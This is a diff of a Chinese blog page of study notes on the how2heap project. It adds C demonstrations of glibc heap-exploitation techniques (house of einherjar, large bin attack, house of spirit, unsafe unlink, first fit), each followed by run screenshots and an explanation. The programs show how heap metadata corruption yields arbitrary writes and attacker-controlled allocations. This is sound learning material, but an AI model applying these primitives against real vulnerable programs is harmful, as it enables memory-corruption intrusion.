@@ -98,7 +98,13 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/picture/how2heap/1.PNG">
 <meta property="og:image" content="http://yoursite.com/picture/how2heap/2.PNG">
-<meta property="og:updated_time" content="2019-05-07T06:39:54.657Z">
+<meta property="og:image" content="http://yoursite.com/picture/how2heap/3.PNG">
+<meta property="og:image" content="http://yoursite.com/picture/how2heap/4.PNG">
+<meta property="og:image" content="http://yoursite.com/picture/how2heap/5.PNG">
+<meta property="og:image" content="http://yoursite.com/picture/how2heap/6.PNG">
+<meta property="og:image" content="http://yoursite.com/picture/how2heap/666.PNG">
+<meta property="og:image" content="http://yoursite.com/picture/how2heap/7.PNG">
+<meta property="og:updated_time" content="2019-05-13T18:33:19.330Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="how2heap学习笔记（一）">
 <meta name="twitter:description" content="how2heap的学习1.fastbin_dup_consolidate.c代码：#include &amp;lt;stdio.h&amp;gt;     #include &amp;lt;stdint.h&amp;gt;     #include &amp;lt;stdlib.h&amp;gt;      int main() {     void* p1 = malloc(0x40);     void* p2 = malloc(0x40)">
@@ -427,6 +433,314 @@
     fprintf(stderr, &quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;, malloc(8));
 </code></pre><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果:"></a>运行结果:</h3><p><img src="/picture/how2heap/2.PNG" alt></p>
 <h3 id="实验分析："><a href="#实验分析：" class="headerlink" title="实验分析："></a>实验分析：</h3><p>首先建立了三个内存为8的chunk分别为a,b,c，然后释放a，这时候a是顶部所以不能再次释放，而当释放了b后，a就不是顶了就可以释放了。<br>在这个程序中，通过free操作，生成了一个freelist。<br>再使用malloc生成chunk d，这个时候就会从fastbin中取出一个，因为栈是LIFO（也就是后进先出），所以chunk A会被取出，如果我们这个时候能对 chunk D 进行操作，如 d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d)); 由于 stack_var = 0x20;这样的定义是在函数内，所以stack_var的地址将在栈上，通过对指针 d 的操作，我们可以伪造一个 chunk ，并将这个 chunk 放在栈上。<br>在这之后malloc就会认为存在这么一个free-chunk,并在之后的内存申请中返回这个地址。<br>这个时候，我们既有fastbins中的 chunk p1 也有small bins 的chunk p2。我们可以malloc两次，第一次从fastbins取出，第二次从small bins中取出。且这两块新 chunk 处于同一个位置。</p>
+<h2 id="3-house-of-einherjar-c"><a href="#3-house-of-einherjar-c" class="headerlink" title="3.house_of_einherjar.c"></a>3.house_of_einherjar.c</h2><h3 id="代码：-2"><a href="#代码：-2" class="headerlink" title="代码："></a>代码：</h3><pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;malloc.h&gt;
+
+/*
+Credit to st4g3r for publishing this technique
+The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()
+This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. 
+*/
+
+int main()
+{
+fprintf(stderr, &quot;Welcome to House of Einherjar!\n&quot;);
+fprintf(stderr, &quot;Tested in Ubuntu 16.04 64bit.\n&quot;);
+fprintf(stderr, &quot;This technique can be used when you have an off-by-one into a malloc&apos;ed region with a null byte.\n&quot;);
+
+uint8_t* a;
+uint8_t* b;
+uint8_t* d;
+
+fprintf(stderr, &quot;\nWe allocate 0x38 bytes for &apos;a&apos;\n&quot;);
+a = (uint8_t*) malloc(0x38);
+fprintf(stderr, &quot;a: %p\n&quot;, a);
+
+int real_a_size = malloc_usable_size(a);
+fprintf(stderr, &quot;Since we want to overflow &apos;a&apos;, we need the &apos;real&apos; size of &apos;a&apos; after rounding: %#x\n&quot;, real_a_size);
+
+// create a fake chunk
+fprintf(stderr, &quot;\nWe create a fake chunk wherever we want, in this case we&apos;ll create the chunk on the stack\n&quot;);
+fprintf(stderr, &quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;);
+fprintf(stderr, &quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;);
+fprintf(stderr, &quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;);
+
+size_t fake_chunk[6];
+
+fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk&apos;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size
+fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin
+fake_chunk[2] = (size_t) fake_chunk; // fwd
+fake_chunk[3] = (size_t) fake_chunk; // bck
+fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
+fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize
+
+
+fprintf(stderr, &quot;Our fake chunk at %p looks like:\n&quot;, fake_chunk);
+fprintf(stderr, &quot;prev_size (not used): %#lx\n&quot;, fake_chunk[0]);
+fprintf(stderr, &quot;size: %#lx\n&quot;, fake_chunk[1]);
+fprintf(stderr, &quot;fwd: %#lx\n&quot;, fake_chunk[2]);
+fprintf(stderr, &quot;bck: %#lx\n&quot;, fake_chunk[3]);
+fprintf(stderr, &quot;fwd_nextsize: %#lx\n&quot;, fake_chunk[4]);
+fprintf(stderr, &quot;bck_nextsize: %#lx\n&quot;, fake_chunk[5]);
+b = (uint8_t*) malloc(0xf8);
+int real_b_size = malloc_usable_size(b);
+
+fprintf(stderr, &quot;\nWe allocate 0xf8 bytes for &apos;b&apos;.\n&quot;);
+fprintf(stderr, &quot;b: %p\n&quot;, b);
+
+uint64_t* b_size_ptr = (uint64_t*)(b - 8);
+/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/
+
+fprintf(stderr, &quot;\nb.size: %#lx\n&quot;, *b_size_ptr);
+fprintf(stderr, &quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;);
+fprintf(stderr, &quot;We overflow &apos;a&apos; with a single null byte into the metadata of &apos;b&apos;\n&quot;);
+a[real_a_size] = 0; 
+fprintf(stderr, &quot;b.size: %#lx\n&quot;, *b_size_ptr);
+fprintf(stderr, &quot;This is easiest if b.size is a multiple of 0x100 so you &quot;
+&quot;don&apos;t change the size of b, only its prev_inuse bit\n&quot;);
+fprintf(stderr, &quot;If it had been modified, we would need a fake chunk inside &quot;
+&quot;b where it will try to consolidate the next chunk\n&quot;);
+
+// Write a fake prev_size to the end of a
+fprintf(stderr, &quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;
+&quot;it will consolidate with our fake chunk\n&quot;, sizeof(size_t));
+size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
+fprintf(stderr, &quot;Our fake prev_size will be %p - %p = %#lx\n&quot;, b-sizeof(size_t)*2, fake_chunk, fake_size);
+*(size_t*)&amp;a[real_a_size-sizeof(size_t)] = fake_size;
+
+//Change the fake chunk&apos;s size to reflect b&apos;s new prev_size
+fprintf(stderr, &quot;\nModify fake chunk&apos;s size to reflect b&apos;s new prev_size\n&quot;);
+fake_chunk[1] = fake_size;
+
+// free b and it will consolidate with our fake chunk
+fprintf(stderr, &quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;);
+free(b);
+fprintf(stderr, &quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;, fake_chunk[1]);
+
+//if we allocate another chunk before we free b we will need to 
+fprintf(stderr, &quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;);
+d = malloc(0x200);
+fprintf(stderr, &quot;Next malloc(0x200) is at %p\n&quot;, d);
+}
+</code></pre><h3 id="运行结果：-1"><a href="#运行结果：-1" class="headerlink" title="运行结果："></a>运行结果：</h3><p><img src="/picture/how2heap/3.PNG" alt></p>
+<h3 id="实验分析：-1"><a href="#实验分析：-1" class="headerlink" title="实验分析："></a>实验分析：</h3><p>首先malloc一个a，然后利用malloc_usable_size函数求出a的实际的大小。<br>我们可以在任何位置去创建一个假的块，包含块的fwd,bckfwd_nextsize以及bck_nextsize，这个实例中是在堆栈上创建的块。<br>然后再malloc一个b，由于b的size是0x100的整数倍，所以您不需要更改b的大小，只需要更改它的prev_inuse位。如果b的大小被修改，我们就要在b的内部放一个fake chunk 这样才能合并这个chunk。<br>我们将假的prev_size写入到a的最后8个字节，这样能将假块合并。<br>更改假块的大小用来反映b的新prev_size，然后free（b），这样b就可以与我们的假块结合在一起了。<br>最后我们调用malloc生成一个chunk，这个chunk的地址从我们的fake chunk的地址开始。</p>
+<h2 id="4-large-bin-attack-c"><a href="#4-large-bin-attack-c" class="headerlink" title="4.large_bin_attack.c"></a>4.large_bin_attack.c</h2><h3 id="代码：-3"><a href="#代码：-3" class="headerlink" title="代码："></a>代码：</h3><pre><code>#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+
+int main()
+{
+fprintf(stderr, &quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;);
+fprintf(stderr, &quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;
+&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;);
+
+unsigned long stack_var1 = 0;
+unsigned long stack_var2 = 0;
+
+fprintf(stderr, &quot;Let&apos;s first look at the targets we want to rewrite on stack:\n&quot;);
+fprintf(stderr, &quot;stack_var1 (%p): %ld\n&quot;, &amp;stack_var1, stack_var1);
+fprintf(stderr, &quot;stack_var2 (%p): %ld\n\n&quot;, &amp;stack_var2, stack_var2);
+
+unsigned long *p1 = malloc(0x320);
+fprintf(stderr, &quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;, p1 - 2);
+
+fprintf(stderr, &quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;
+&quot; the first large chunk during the free()\n\n&quot;);
+malloc(0x20);
+
+unsigned long *p2 = malloc(0x400);
+fprintf(stderr, &quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;, p2 - 2);
+
+fprintf(stderr, &quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;
+&quot; the second large chunk during the free()\n\n&quot;);
+malloc(0x20);
+
+unsigned long *p3 = malloc(0x400);
+fprintf(stderr, &quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;, p3 - 2);
+
+fprintf(stderr, &quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;
+&quot; the third large chunk during the free()\n\n&quot;);
+malloc(0x20);
+
+free(p1);
+free(p2);
+fprintf(stderr, &quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;
+&quot; [ %p &lt;--&gt; %p ]\n\n&quot;, (void *)(p2 - 2), (void *)(p2[0]));
+
+malloc(0x90);
+fprintf(stderr, &quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;
+&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;
+&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;
+&quot; [ %p ]\n\n&quot;, (void *)((char *)p1 + 0x90));
+
+free(p3);
+fprintf(stderr, &quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;
+&quot; [ %p &lt;--&gt; %p ]\n\n&quot;, (void *)(p3 - 2), (void *)(p3[0]));
+
+//------------VULNERABILITY-----------
+
+fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the freed second large chunk&apos;s \&quot;size\&quot;&quot;
+&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;);
+fprintf(stderr, &quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;
+&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;
+&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;);
+
+p2[-1] = 0x3f1;
+p2[0] = 0;
+p2[2] = 0;
+p2[1] = (unsigned long)(&amp;stack_var1 - 2);
+p2[3] = (unsigned long)(&amp;stack_var2 - 4);
+
+//------------------------------------
+
+malloc(0x90);
+
+fprintf(stderr, &quot;Let&apos;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;
+&quot; During this time, targets should have already been rewritten:\n&quot;);
+
+fprintf(stderr, &quot;stack_var1 (%p): %p\n&quot;, &amp;stack_var1, (void *)stack_var1);
+fprintf(stderr, &quot;stack_var2 (%p): %p\n&quot;, &amp;stack_var2, (void *)stack_var2);
+
+return 0;
+}
+</code></pre><h3 id="运行结果：-2"><a href="#运行结果：-2" class="headerlink" title="运行结果："></a>运行结果：</h3><p> <img src="/picture/how2heap/4.PNG" alt><br>实验分析：<br>首先我们创建三个largechunk，他们之间都malloc（0x20）为了让他们之间在free后不会自动合并。<br>Free（p1），free（p2），这样他们 就会被插入到unsortedbins中。然后我们malloc一个大小小于p1的chunk，这样就会将p2放到long bins中，而将p1的剩余部分放到unsorted bins中。然后free（p3），这样就把p3放在了unsorted bins中。<br>接下来我们使用如下代码修改p2的chunk：<br>p2[-1] = 0x3f1;<br>    p2[0] = 0;<br>    p2[2] = 0;<br>    p2[1] = (unsigned long)(&amp;stack_var1 - 2);<br>    p2[3] = (unsigned long)(&amp;stack_var2 - 4);<br>然后我们 malloc 一块新的 chunk，此时，由于此时 fastbin 为空，程序遍历 unsorte bin，当时此时 unsorte bin 里的 chunk 为 large bin 的时候，首先判断当前的 chunk size 是不是小于 bck-&gt;bk 的 size，也就是 large bin 里最小的 chunk，如果是，直接添加到末尾。如果不是，就正向遍历 large bin，直到找到一个 chunk 的 size 小于等于当前 chunk size（large bin 的 chunk 是从大到小正向排列的）。然后将当前的 chunk 插入到 large bin 的两个链表中。<br>注：large bin chunk 里的fd_nextsize指向的是链表中第一个比自己小的 chunk，bk_nextsize指向第一个比自己大的 chunk。</p>
+<h2 id="5-house-of-spirit-c"><a href="#5-house-of-spirit-c" class="headerlink" title="5.house_of_spirit.c"></a>5.house_of_spirit.c</h2><h3 id="代码：-4"><a href="#代码：-4" class="headerlink" title="代码："></a>代码：</h3><pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main()
+{
+fprintf(stderr, &quot;This file demonstrates the house of spirit attack.\n&quot;);
+
+fprintf(stderr, &quot;Calling malloc() once so that it sets up its memory.\n&quot;);
+malloc(1);
+
+fprintf(stderr, &quot;We will now overwrite a pointer to point to a fake &apos;fastbin&apos; region.\n&quot;);
+unsigned long long *a;
+// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
+unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
+
+fprintf(stderr, &quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;, sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]);
+
+fprintf(stderr, &quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;);
+fprintf(stderr, &quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;);
+fake_chunks[1] = 0x40; // this is the size
+
+fprintf(stderr, &quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;);
+// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
+fake_chunks[9] = 0x1234; // nextsize
+
+fprintf(stderr, &quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;, &amp;fake_chunks[1]);
+fprintf(stderr, &quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;);
+a = &amp;fake_chunks[2];
+
+fprintf(stderr, &quot;Freeing the overwritten pointer.\n&quot;);
+free(a);
+
+fprintf(stderr, &quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[2]);
+fprintf(stderr, &quot;malloc(0x30): %p\n&quot;, malloc(0x30));
+}
+</code></pre><h3 id="运行结果：-3"><a href="#运行结果：-3" class="headerlink" title="运行结果："></a>运行结果：</h3><p> <img src="/picture/how2heap/5.PNG" alt></p>
+<h3 id="实验分析：-2"><a href="#实验分析：-2" class="headerlink" title="实验分析："></a>实验分析：</h3><p>这个实验就是构建chunk，然后将就将其free掉，这样就能在下次malloc的时候调用这fake chunk的地址。<br>首先我们malloc一次（为了方便设置内存），然后本别定义  fack_chunks[1]的大小以及next chunk也就是fack_chunks[9]的大小，但是我们要保证这两个chunk的内存在32和128之间，因为fast chunk是有大小的，这样才能跳过检查。<br>fake_chunks[1] = 0x40; // this is the size=<br>fake_chunks[9] = 0x1234; // nextsize<br>接下来我们将fake_chunks[2]地地址赋值给a，然后再进行free<br>a = &amp;fake_chunks[2];<br>free(a);<br>这样就把原来不存在于内存中的fake_chunks[2]给free了，这就导致fastbin中出现原本存在内容得地址，这样下次调用malloc的时候如果检查fastbin的首块符合大小要求就会对其进行调用。这样就会对原来本来存在的fake_chunks[9]的内存进行更改，实现了攻击。<br>house-of-spirit 的主要目的是，当我们伪造的 fake chunk 内部存在不可控区域时，运用这一技术可以将这片区域变成可控的。</p>
+<h2 id="6-unsafe-unlink-c"><a href="#6-unsafe-unlink-c" class="headerlink" title="6.unsafe_unlink.c"></a>6.unsafe_unlink.c</h2><h3 id="代码：-5"><a href="#代码：-5" class="headerlink" title="代码："></a>代码：</h3><pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+
+
+uint64_t *chunk0_ptr;
+
+int main()
+{
+fprintf(stderr, &quot;Welcome to unsafe unlink 2.0!\n&quot;);
+fprintf(stderr, &quot;Tested in Ubuntu 14.04/16.04 64bit.\n&quot;);
+fprintf(stderr, &quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;);
+fprintf(stderr, &quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;);
+
+int malloc_size = 0x80; //we want to be big enough not to use fastbins
+int header_size = 2;
+
+fprintf(stderr, &quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;);
+
+chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
+uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size); //chunk1
+fprintf(stderr, &quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;, &amp;chunk0_ptr, chunk0_ptr);
+fprintf(stderr, &quot;The victim chunk we are going to corrupt is at %p\n\n&quot;, chunk1_ptr);
+
+fprintf(stderr, &quot;We create a fake chunk inside chunk0.\n&quot;);
+fprintf(stderr, &quot;We setup the &apos;next_free_chunk&apos; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;);
+chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3);
+fprintf(stderr, &quot;We setup the &apos;previous_free_chunk&apos; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;);
+fprintf(stderr, &quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;);
+chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2);
+fprintf(stderr, &quot;Fake chunk fd: %p\n&quot;,(void*) chunk0_ptr[2]);
+fprintf(stderr, &quot;Fake chunk bk: %p\n\n&quot;,(void*) chunk0_ptr[3]);
+
+fprintf(stderr, &quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;);
+uint64_t *chunk1_hdr = chunk1_ptr - header_size;
+fprintf(stderr, &quot;We shrink the size of chunk0 (saved as &apos;previous_size&apos; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;);
+fprintf(stderr, &quot;It&apos;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;);
+chunk1_hdr[0] = malloc_size;
+fprintf(stderr, &quot;If we had &apos;normally&apos; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;,(void*)chunk1_hdr[0]);
+fprintf(stderr, &quot;We mark our fake chunk as free by setting &apos;previous_in_use&apos; of chunk1 as False.\n\n&quot;);
+chunk1_hdr[1] &amp;= ~1;
+
+fprintf(stderr, &quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;);
+fprintf(stderr, &quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;);
+free(chunk1_ptr);
+
+fprintf(stderr, &quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;);
+char victim_string[8];
+strcpy(victim_string,&quot;Hello!~&quot;);
+chunk0_ptr[3] = (uint64_t) victim_string;
+
+fprintf(stderr, &quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;);
+fprintf(stderr, &quot;Original value: %s\n&quot;,victim_string);
+chunk0_ptr[0] = 0x4141414142424242LL;
+fprintf(stderr, &quot;New Value: %s\n&quot;,victim_string);
+}
+</code></pre><h3 id="运行结果：-4"><a href="#运行结果：-4" class="headerlink" title="运行结果："></a>运行结果：</h3><p><img src="/picture/how2heap/6.PNG" alt><br>由于Ubuntu18没有这个漏洞，所以我又用Ubuntu16跑了一下程序结果如下：<br><img src="/picture/how2heap/666.PNG" alt></p>
+<h3 id="实验分析：-3"><a href="#实验分析：-3" class="headerlink" title="实验分析："></a>实验分析：</h3><p>这个实验场景容易出现在易受攻击的可以溢出并具有全局指针的缓冲区。<br>这个练习的目的是使用free来破坏全局chunk0_ptr以实现任意内存写入。<br>首先把定义chunk0和chunk1（malloc_size = 0x80，这样才能不使用fastbins），然后在chunk0地址附近创建一个假的块。<br>我们伪造 fake chunk 的fd 为 chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)<em>3);<br>我们伪造 fake chunk 的bk 为chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)</em>2);<br>这样我们伪造的chunk的地址就包含在chunk0中了。<br>这时候假设我们的chunk0有溢出，这样就可以自由更改chunk1的值。然后释放chunk1，这样由于chunk1前面是我们自己新创建的chunk，所以会发生unlink，由于我们吧chunk0的头更改到新创建的位置（我们缩小chunk1的presize(表示的是chunk0的size),好让free认为chunk0是从我们伪造的堆块开始的。），所以这样就会让chunk0和chunk1连接在一起。<br>chunk0_ptr[3] = (uint64_t) victim_string; //vimtim_string = “ Hello!~”<br>chunk0_ptr[0] = 0x4141414142424242LL; //vimtim_string = BBBBAAAA<br>printf(“New Value: %s\n”,victim_string);<br>修改chunk0_ptr[0]的值其实是在修改它指向的位置，让它指向vimtim_string 然后修改chunk0_ptr[0]就修改了vimtim_string字符串本身。 也就是说我们通过修改chunk0_ptr[3]的值为我们想要修改的地址，就可以实现任意地址读写操作。<br>总结下，如果我们找到一个全局指针，通过unlink的手段，我们就构造一个chunk指向这个指针所指向的位置，然后通过对chunk的操作来进行读写操作。</p>
+<h2 id="7-first-fit-c"><a href="#7-first-fit-c" class="headerlink" title="7.first_fit.c"></a>7.first_fit.c</h2><h3 id="代码：-6"><a href="#代码：-6" class="headerlink" title="代码："></a>代码：</h3><pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main()
+{
+fprintf(stderr, &quot;This file doesn&apos;t demonstrate an attack, but shows the nature of glibc&apos;s allocator.\n&quot;);
+fprintf(stderr, &quot;glibc uses a first-fit algorithm to select a free chunk.\n&quot;);
+fprintf(stderr, &quot;If a chunk is free and large enough, malloc will select this chunk.\n&quot;);
+fprintf(stderr, &quot;This can be exploited in a use-after-free situation.\n&quot;);
+
+fprintf(stderr, &quot;Allocating 2 buffers. They can be large, don&apos;t have to be fastbin.\n&quot;);
+char* a = malloc(512);
+char* b = malloc(256);
+char* c;
+
+fprintf(stderr, &quot;1st malloc(512): %p\n&quot;, a);
+fprintf(stderr, &quot;2nd malloc(256): %p\n&quot;, b);
+fprintf(stderr, &quot;we could continue mallocing here...\n&quot;);
+fprintf(stderr, &quot;now let&apos;s put a string at a that we can read later \&quot;this is A!\&quot;\n&quot;);
+strcpy(a, &quot;this is A!&quot;);
+fprintf(stderr, &quot;first allocation %p points to %s\n&quot;, a, a);
+
+fprintf(stderr, &quot;Freeing the first one...\n&quot;);
+free(a);
+
+fprintf(stderr, &quot;We don&apos;t need to free anything again. As long as we allocate less than 512, it will end up at %p\n&quot;, a);
+
+fprintf(stderr, &quot;So, let&apos;s allocate 500 bytes\n&quot;);
+c = malloc(500);
+fprintf(stderr, &quot;3rd malloc(500): %p\n&quot;, c);
+fprintf(stderr, &quot;And put a different string here, \&quot;this is C!\&quot;\n&quot;);
+strcpy(c, &quot;this is C!&quot;);
+fprintf(stderr, &quot;3rd allocation %p points to %s\n&quot;, c, c);
+fprintf(stderr, &quot;first allocation %p points to %s\n&quot;, a, a);
+fprintf(stderr, &quot;If we reuse the first allocation, it now holds the data from the third allocation.\n&quot;);
+}
+</code></pre><h3 id="运行结果：-5"><a href="#运行结果：-5" class="headerlink" title="运行结果："></a>运行结果：</h3><p><img src="/picture/how2heap/7.PNG" alt></p>
+<h3 id="实验分析：-4"><a href="#实验分析：-4" class="headerlink" title="实验分析："></a>实验分析：</h3><p>首先malloc两个chunk大小分别为512和256，然后我们使用strcpy(a, “this is A!”);将a赋值，然后再free a，由于chunk A 大小为 512 不适于 fastbins 系统会将这个chunk 放入unsortedbin。<br>这时候来说一下unsortedbin以及malloc的使用情况：<br>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取。<br>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。<br>所以这时候我们malloc（500），这样就会选取刚刚释放的a，因为a的内存和500差不多。然后当为c赋值之后，调用c和之前的a都会出现给c赋的值，也就是“This is c”。<br>这是由于指针free后没有置0引起的。</p>
 
       
     </div>
@@ -573,7 +887,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -586,7 +900,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -626,7 +940,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#how2heap的学习"><span class="nav-number">1.</span> <span class="nav-text">how2heap的学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-fastbin-dup-consolidate-c"><span class="nav-number">1.1.</span> <span class="nav-text">1.fastbin_dup_consolidate.c</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码："><span class="nav-number">1.1.1.</span> <span class="nav-text">代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#运行结果："><span class="nav-number">1.1.2.</span> <span class="nav-text">运行结果：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析："><span class="nav-number">1.1.3.</span> <span class="nav-text">分析：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-fastbin-dup-into-stack-c"><span class="nav-number">1.2.</span> <span class="nav-text">2.fastbin_dup_into_stack.c</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码：-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#运行结果"><span class="nav-number">1.2.2.</span> <span class="nav-text">运行结果:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验分析："><span class="nav-number">1.2.3.</span> <span class="nav-text">实验分析：</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#how2heap的学习"><span class="nav-number">1.</span> <span class="nav-text">how2heap的学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-fastbin-dup-consolidate-c"><span class="nav-number">1.1.</span> <span class="nav-text">1.fastbin_dup_consolidate.c</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码："><span class="nav-number">1.1.1.</span> <span class="nav-text">代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#运行结果："><span class="nav-number">1.1.2.</span> <span class="nav-text">运行结果：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析："><span class="nav-number">1.1.3.</span> <span class="nav-text">分析：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-fastbin-dup-into-stack-c"><span class="nav-number">1.2.</span> <span class="nav-text">2.fastbin_dup_into_stack.c</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码：-1"><span 